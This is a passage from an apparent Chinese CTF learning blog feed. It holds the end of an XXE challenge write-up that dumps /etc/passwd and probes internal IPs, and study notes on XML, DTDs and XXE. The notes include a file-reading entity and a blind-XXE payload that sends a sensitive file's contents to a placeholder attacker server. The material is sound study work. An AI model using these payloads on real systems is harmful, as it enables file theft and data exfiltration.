class="hljs-symbol">uucp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:uucp</span><span class="hljs-symbol">:/var/spool/uucp</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span><span class="hljs-symbol">:proxy</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby">www-<span class="hljs-symbol">data:</span><span class="hljs-symbol">x:</span><span class="hljs-number">33</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:www-data</span><span class="hljs-symbol">:/var/www</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">backup:</span><span class="hljs-symbol">x:</span><span class="hljs-number">34</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span><span class="hljs-symbol">:backup</span><span class="hljs-symbol">:/var/backups</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">list:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:Mailing</span> <span class="hljs-title class_">List</span> <span class="hljs-title class_">Manager</span><span class="hljs-symbol">:/var/list</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">irc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:ircd</span><span class="hljs-symbol">:/var/run/ircd</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">gnats:</span><span class="hljs-symbol">x:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:Gnats</span> <span class="hljs-title class_">Bug</span>-<span class="hljs-title class_">Reporting</span> <span class="hljs-title class_">System</span> (admin)<span class="hljs-symbol">:/var/lib/gnats</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">_apt:</span><span class="hljs-symbol">x:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby">&lt;<span class="hljs-regexp">/msg&gt;&lt;/result</span>&gt;</span><br></code></pre></td></tr></table></figure><p>那这一串有啥用捏？好像没啥用，那就再读读其他文件: proc&#x2F;net&#x2F;arp</p><p>回显:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>openresty<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Sat, 19 Mar 2022 01:44:27 GMT<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=utf-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>275<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Vary</span><span class="hljs-punctuation">: </span>Accept-Encoding<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>PHP/7.4.0RC6<br><br><span class="language-apache"><span class="hljs-section">&lt;result&gt;</span><span class="hljs-section">&lt;code&gt;</span><span class="hljs-attribute">0</span>&lt;/code&gt;&lt;msg&gt;IP address       HW type     Flags       HW address            Mask     Device</span><br><span class="language-apache"><span class="hljs-attribute">169</span>.<span class="hljs-number">254</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>      <span class="hljs-number">0</span>x1         <span class="hljs-number">0</span>x2         ee:ee:ee:ee:ee:ee     *        eth0</span><br><span class="language-apache"><span class="hljs-attribute">10</span>.<span class="hljs-number">128</span>.<span class="hljs-number">253</span>.<span class="hljs-number">12</span>    <span class="hljs-number">0</span>x1         <span class="hljs-number">0</span>x2         ee:ee:ee:ee:ee:ee     *        eth0</span><br><span class="language-apache"><span class="hljs-section">&lt;/msg&gt;</span><span class="hljs-section">&lt;/result&gt;</span></span><br></code></pre></td></tr></table></figure><p>这玩意有啥用捏? 8知道，只知道是内网的，也就是只能通过里面的服务器读取。尝试读取ip: </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file://http://169.254.1.1&quot;</span>&gt;</span></span><br><span class="hljs-meta">  ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p>至于此处为啥是http而8是https呢？8要管了，以后会懂的<br>等待过程相当龟速…..</p><p>然后结果是: 2个ip都报错，原因是connection time out in</p><p>那就利用burp的intruder扫一下端口</p><p>又是1个龟速的过程……看看有没有其他解法</p><p>扫失败了，然后就扫一下地址，又叫内网扫描(eg:把http:169.254.1.1的最后一位数进行爆破)</p><p>暴躁老哥上线，他妈的哪里出问题了? 老子一步一步按wp走的啊</p><p>分析下原因，wp里，当访问ip时的回显和我的8一样，我的是请求时间过长(connection time out in)，而wp的则是请求被拒绝(connection refused in)，一个能ping通，1个8能ping通….也许这就是问题所在</p><p>那为什么会请求时间过长呢? 我8知道，看了好多wp都是这个解法，没找到原因</p><p>请求时间过长显然是内网的服务器的问题，而8是我这边的问题，那就这样吧，这破题就这么过了</p><p>然后就很8爽啊啊啊啊啊啊</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xxe攻击(1)</title>
    <link href="/2022/02/10/xxe%E6%94%BB%E5%87%BB(1)/"/>
    <url>/2022/02/10/xxe%E6%94%BB%E5%87%BB(1)/</url>
    
    <content type="html"><![CDATA[<p>菜鸡脑容量有限，学完删</p><p>XXE全称balabala，即xml外部实体注入</p><p>为此首先需要了解xml，在w3school学习后做了些笔记以备忘</p><p>其次需要学习php伪协议、php解析xml的一些功能函数</p><p>还有</p><h1 id="xml"><a href="#xml" class="headerlink" title="xml"></a>xml</h1><p>很像html，用于标记文件，使其具有结构性，是标记性语言(类似ppt….个p)<br>但xml是为了传输、存储数据，而8是显示数据</p><p>xml不做任何事情，也就是纯文本，用来存储、传输信息，类似json</p><h2 id="xml结构"><a href="#xml结构" class="headerlink" title="xml结构"></a>xml结构</h2><p>eg:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> standalone=<span class="hljs-string">&quot;yes&quot;</span>?&gt;</span><span class="hljs-comment">&lt;!--xml文件的声明，这个是可选的--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bookstore</span>&gt;</span>                                                 <span class="hljs-comment">&lt;!--根元素--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">book</span> <span class="hljs-attr">category</span>=<span class="hljs-string">&quot;COOKING&quot;</span>&gt;</span>        <span class="hljs-comment">&lt;!--bookstore的子元素，category为属性--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Everyday Italian<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>           <span class="hljs-comment">&lt;!--book的子元素，lang为属性--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span>Giada De Laurentiis<span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span>                  <span class="hljs-comment">&lt;!--book的子元素--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">year</span>&gt;</span>2005<span class="hljs-tag">&lt;/<span class="hljs-name">year</span>&gt;</span>                                     <span class="hljs-comment">&lt;!--book的子元素--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>30.00<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>                                  <span class="hljs-comment">&lt;!--book的子元素--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">book</span>&gt;</span>                                                 <span class="hljs-comment">&lt;!--book的结束--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bookstore</span>&gt;</span>                                       <span class="hljs-comment">&lt;!--bookstore的结束--&gt;</span><br></code></pre></td></tr></table></figure><p>总结:xml有根元素属性，即必须包含根元素，每个元素阔以有value和属性</p><h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><p>定义xml文档的格式规范</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span> <span class="hljs-comment">&lt;!--这行是 XML文档定义--&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">message</span> (<span class="hljs-keyword">receiver</span> ,<span class="hljs-keyword">sender</span> ,<span class="hljs-keyword">header</span> ,<span class="hljs-keyword">msg</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">receiver</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">sender</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">header</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">msg</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br></code></pre></td></tr></table></figure><p>上述格式是固定的，然后PCDATA和CDATA代指传入的文本，PCDATA文本里的标签会被解析，而CDATA则8会</p><p>可分为内部DTD和外部DTD</p><h3 id="内部DTD"><a href="#内部DTD" class="headerlink" title="内部DTD"></a>内部DTD</h3><p>内部DTD就是xml文档和DTD写在一块,eg:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [&lt;!--定义此文档是 note 类型的文档--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">note</span> (<span class="hljs-keyword">to</span>,<span class="hljs-keyword">from</span>,<span class="hljs-keyword">heading</span>,<span class="hljs-keyword">body</span>)&gt;</span>&lt;!--定义note元素有四个元素--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">to</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>&lt;!--定义to元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">from</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>&lt;!--定义from元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">head</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>&lt;!--定义head元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">body</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>&lt;!--定义body元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Y0u<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>@re<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>v3ry<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>g00d!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="外部DTD"><a href="#外部DTD" class="headerlink" title="外部DTD"></a>外部DTD</h3><p>外部则是引用外部文件，通过如下语法引入：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root-element</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;filename&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>DTD属性<br>eg:<br>DTD:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ATTLIST <span class="hljs-keyword">payment</span> <span class="hljs-keyword">Luckey</span> <span class="hljs-keyword">CDATA</span> <span class="hljs-string">&quot;Q&quot;</span>&gt;</span>    <span class="hljs-comment">&lt;!--payment可在之前被定义过，也可未定义，默认属性: Q--&gt;</span><br></code></pre></td></tr></table></figure><p>XML实例:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">payment</span> <span class="hljs-attr">Luckey</span>=<span class="hljs-string">&quot;Q&quot;</span> /&gt;</span>   <span class="hljs-comment">&lt;!--name: payment; 属性: Lucky --&gt;</span><br></code></pre></td></tr></table></figure><h2 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h2><p>大致阔以当变量理解，由name和value组成，有通用实体和参数实体之分，也有内部实体和外部实体之分</p><h3 id="通用实体和参数实体"><a href="#通用实体和参数实体" class="headerlink" title="通用实体和参数实体"></a>通用实体和参数实体</h3><p>通用实体: 用 &amp;实体名; 来引用实体，就是在DTD中定义的普通实体，这个实体在xml文档中被引用<br>参数实体: 用 % 实体名 (注意%后的空格)来在DTD内定义实体，而这个实体只能在DTD内引用(通用实体则能在xml文档里引用)，引用则是通过 % 实体名; 实现(注意’;’)<br>(参数实体也阔以引用外部实体，它在blindxxe里很有用)</p><p>声明方法:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">name</span> <span class="hljs-string">&quot;value&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>引用方法:<br>引用通用实体:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-symbol">&amp;name;</span><br></code></pre></td></tr></table></figure><p>声明参数实体: </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ATTLIST % <span class="hljs-keyword">payment</span> <span class="hljs-keyword">Lucky</span> <span class="hljs-keyword">CDATA</span> <span class="hljs-string">&quot;Q&quot;</span>&gt;</span>   <span class="hljs-comment">&lt;!--用% name来声明--&gt;</span><br></code></pre></td></tr></table></figure><p>引用参数实体:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">% name;  <span class="hljs-comment">&lt;!--注意%后的空格--&gt;</span><br></code></pre></td></tr></table></figure><h3 id="内部实体和外部实体"><a href="#内部实体和外部实体" class="headerlink" title="内部实体和外部实体"></a>内部实体和外部实体</h3><p>内部实体:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">name</span> <span class="hljs-string">&quot;value&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>eg：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version = <span class="hljs-string">&quot;1.0&quot;</span> encoding = <span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">writer</span> <span class="hljs-string">&quot;Dawn&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY c0pyright <span class="hljs-string">&quot;Copyright W3School.com.cn&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><span class="hljs-symbol">&amp;writer;</span>&amp;c0pyright;<span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></td></tr></table></figure><p>外部实体: 用来引入外部资源。有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机<br>且外部实体支持http、file等协议</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY 实体名称 <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;URI/URL&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Or:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY 实体名称 <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;public_ID&quot;</span> <span class="hljs-string">&quot;URI&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>外部实体示例代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version = <span class="hljs-string">&quot;1.0&quot;</span> encoding = <span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY c0pyright <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span><span class="hljs-symbol">&amp;file;</span>&amp;c0pyright;<span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br></code></pre></td></tr></table></figure><p>tips<br>实体引用<br>在xml里，如果把’&lt;’’&gt;’之类的字符直接放进去，会被解析，然后出现错误，为此要用实体引用来代替(类似转义)</p><p>&lt; &lt; 小于</p><blockquote><blockquote><p>大于<br>&amp; &amp; 和号<br>&apos; ‘ 单引号<br>“ “ 引号</p></blockquote></blockquote><p>eg:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>100&amp;lt1000<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure><p>php解析xml的函数<br>DOMDocument()<br>PHP5中提供了DOMDocument类对XML的解析</p><p>simplexml_import_dom()</p><p>simplexml_import_dom($dom)获取XML文档节点，如果成功则返回SimpleXMLElement对象</p><p>libxml_disable_entity_loader(false); #- 禁用加载外部实体的功能，默认为True，所以学xxe真的能用得上吗(萌新日常怀疑)</p><p>simple_xml_load_string(): 转换形式良好的 XML 字符串为 SimpleXMLElement 对象，然后输出对象的键和元素</p><h1 id="XXE盲注"><a href="#XXE盲注" class="headerlink" title="XXE盲注"></a>XXE盲注</h1><p>在刷了一些比较简单的题后，开始进入盲注，先学习下姿势的原理(看bw大佬的文章)<br>首先需要了解1个报错</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">roottag</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">start</span> <span class="hljs-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span> </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">goodies</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///xxx.txt&quot;</span>&gt;</span> </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">end</span> <span class="hljs-string">&quot;]]&gt;&quot;</span>&gt;</span> </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">all</span> <span class="hljs-string">&quot;%start;%goodies;%end;&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">roottag</span>&gt;</span><span class="hljs-symbol">&amp;all;</span><span class="hljs-tag">&lt;/<span class="hljs-name">roottag</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>这样做会报错，原因是我也没看懂…..总之需要在外部实体拼接后再在DTD中调用，也就是下面的做法，引用外部服务器里的文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">roottag</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">start</span> <span class="hljs-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span> </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">goodies</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///xxx.txt&quot;</span>&gt;</span> </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">end</span> <span class="hljs-string">&quot;]]&gt;&quot;</span>&gt;</span> </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://ip/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%dtd;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">roottag</span>&gt;</span><span class="hljs-symbol">&amp;all;</span><span class="hljs-tag">&lt;/<span class="hljs-name">roottag</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--evil.dtd--&gt;</span><br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">all</span> <span class="hljs-string">&quot;%start;%goodies;%end;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>无回显:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--evil.dtd--&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///xxx.txt&quot;</span>&gt;</span>    <span class="hljs-comment">&lt;!--xxx.txt为敏感文件--&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">int</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://ip?p=%file;&#x27;&gt;&quot;</span>&gt;</span>   <span class="hljs-comment">&lt;!--此处的&amp;#37;为转义的%--&gt;</span><br><br><span class="hljs-comment">&lt;!--payload--&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">convert</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://ip/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%remote;%int;%send;</span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure><p>如上，先引用remote，于是引用了evil.dtd，就相当于将evil.dtd里的内容拼接到payload里<br>然后再引用int，int声明了send，再引用了send，send就执行了 [<code>]http://ip=%file;[</code>]的操作，将file.txt发送到你的服务器，解决了xxe无回显的问题,tttttttttttttqqqqqqllllllllllllll</p><p>3.22 那么问题来了，就是我还没个服务器….<br>有台旧电脑，明天坐教室后排好好整整，八字还没一撇……</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2021_summary?</title>
    <link href="/2022/02/02/2021-summary/"/>
    <url>/2022/02/02/2021-summary/</url>
    
